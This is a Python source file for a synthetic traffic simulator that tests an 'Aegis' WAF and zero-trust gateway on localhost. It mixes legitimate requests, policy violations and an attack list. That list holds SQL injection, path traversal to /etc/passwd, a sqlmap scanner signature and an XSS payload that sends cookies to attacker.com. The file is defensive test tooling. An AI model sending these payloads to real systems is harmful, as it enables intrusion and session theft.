"""
Aegis Synthetic Traffic & Threat Simulator
Generates real concurrent legitimate corporate traffic, Zero-Trust edge cases, and attack vectors.
"""

import time
import random
import threading
import requests
from typing import Dict, Any

class TrafficSimulator:
    def __init__(self, target_url: str = "http://127.0.0.1:8080"):
        self.target_url = target_url.rstrip("/")
        self.is_running = False
        self.worker_thread = None
        self.stats = {
            "total_sent": 0,
            "allowed_sent": 0,
            "threats_sent": 0,
            "rate_bursts_sent": 0,
            "zero_trust_denies_sent": 0,
            "start_time": None
        }
        self.lock = threading.Lock()

        # Legitimate corporate personas
        self.legit_scenarios = [
            {
                "path": "/api/v1/public/status",
                "method": "GET",
                "headers": {"User-Agent": "AegisHealthCheck/1.0"},
                "desc": "Public Gateway Health Probe"
            },
            {
                "path": "/api/v1/billing/ledger",
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer token-finance",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/128.0.0.0",
                    "X-Device-Id": "WIN11-SECURE-4410",
                    "X-Device-Trust": "92"
                },
                "desc": "Authorized Finance Lead Ledger Query"
            },
            {
                "path": "/api/v1/identity/users",
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer token-devops",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                    "X-Device-Id": "LINUX-DEV-7712",
                    "X-Device-Trust": "89"
                },
                "desc": "DevOps Directory Sync"
            },
            {
                "path": "/api/v1/workloads/clusters",
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer token-devops",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                    "X-Device-Id": "LINUX-DEV-7712",
                    "X-Device-Trust": "89"
                },
                "desc": "Kubernetes Cluster Telemetry Poll"
            },
            {
                "path": "/api/v1/billing/ledger",
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer token-admin",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Apple Silicon M3)",
                    "X-Device-Id": "MAC-M3-CORP-9921",
                    "X-Device-Trust": "96"
                },
                "desc": "Super Admin Audit Check"
            }
        ]

        # Zero-Trust Violations (Untrusted Device, Missing Role)
        self.zero_trust_scenarios = [
            {
                "path": "/api/v1/billing/ledger",
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer token-intern",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4)",
                    "X-Device-Id": "BYOD-MOBILE-2201",
                    "X-Device-Trust": "48"  # Required is 80 -> Blocked by Zero Trust!
                },
                "desc": "Zero-Trust Violation: Low Device Trust Score (48/100)"
            },
            {
                "path": "/api/v1/billing/ledger",
                "method": "GET",
                "headers": {
                    "Authorization": "Bearer token-devops",  # DevOps role attempting financial ledger -> Blocked!
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                    "X-Device-Id": "LINUX-DEV-7712",
                    "X-Device-Trust": "89"
                },
                "desc": "Zero-Trust Violation: Role Unauthorized for Finance Ledger"
            },
            {
                "path": "/api/v1/identity/users",
                "method": "GET",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                    # No token provided for restricted directory -> Blocked!
                },
                "desc": "Zero-Trust Violation: Unauthenticated access to Internal Directory"
            }
        ]

        # Malicious Attack Vectors (SQLi, XSS, Scanner, Traversal)
        self.attack_scenarios = [
            {
                "path": "/api/v1/billing/ledger?account=901' OR '1'='1'--",
                "method": "GET",
                "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                "desc": "WAF Block: SQL Injection Tautology Attack"
            },
            {
                "path": "/api/v1/billing/ledger?sort=id UNION SELECT password, username FROM users--",
                "method": "GET",
                "headers": {"User-Agent": "Mozilla/5.0"},
                "desc": "WAF Block: SQL Union Based Exfiltration"
            },
            {
                "path": "/api/v1/public/status?view=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
                "method": "GET",
                "headers": {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
                "desc": "WAF Block: Cross-Site Scripting (XSS) Session Hijack"
            },
            {
                "path": "/api/v1/identity/users?file=../../../../etc/passwd",
                "method": "GET",
                "headers": {"User-Agent": "Mozilla/5.0"},
                "desc": "WAF Block: Path Traversal & LFI Attack"
            },
            {
                "path": "/api/v1/public/status",
                "method": "GET",
                "headers": {"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"},
                "desc": "WAF Block: Automated Vulnerability Scanner Signature"
            }
        ]

    def start(self, rps: float = 3.0):
        if self.is_running:
            return
        self.is_running = True
        self.stats["start_time"] = time.time()
        self.worker_thread = threading.Thread(target=self._run_loop, args=(rps,), daemon=True)
        self.worker_thread.start()

    def stop(self):
        self.is_running = False

    def get_status(self) -> Dict[str, Any]:
        with self.lock:
            uptime = round(time.time() - self.stats["start_time"], 1) if self.stats["start_time"] else 0
            return {
                "running": self.is_running,
                "uptime_seconds": uptime,
                **self.stats
            }

    def _run_loop(self, rps: float):
        delay = 1.0 / max(0.5, rps)
        session = requests.Session()

        while self.is_running:
            try:
                roll = random.random()

                if roll < 0.60:
                    # 60% Legitimate corporate requests
                    scenario = random.choice(self.legit_scenarios)
                    self._send(session, scenario)
                    with self.lock:
                        self.stats["total_sent"] += 1
                        self.stats["allowed_sent"] += 1

                elif roll < 0.85:
                    # 25% Zero-Trust violation edge cases
                    scenario = random.choice(self.zero_trust_scenarios)
                    self._send(session, scenario)
                    with self.lock:
                        self.stats["total_sent"] += 1
                        self.stats["zero_trust_denies_sent"] += 1

                else:
                    # 15% Real attack payloads
                    scenario = random.choice(self.attack_scenarios)
                    self._send(session, scenario)
                    with self.lock:
                        self.stats["total_sent"] += 1
                        self.stats["threats_sent"] += 1

            except Exception as e:
                pass

            time.sleep(delay + random.uniform(-0.1, 0.1))

    def _send(self, session: requests.Session, scenario: Dict[str, Any]):
        url = self.target_url + scenario["path"]
        method = scenario.get("method", "GET")
        headers = scenario.get("headers", {})
        try:
            session.request(method, url, headers=headers, timeout=2.0)
        except Exception:
            pass

if __name__ == "__main__":
    sim = TrafficSimulator("http://127.0.0.1:8080")
    print("Testing Traffic Simulator for 5 seconds...")
    sim.start(rps=4)
    time.sleep(5)
    sim.stop()
    print("Stats:", sim.get_status())
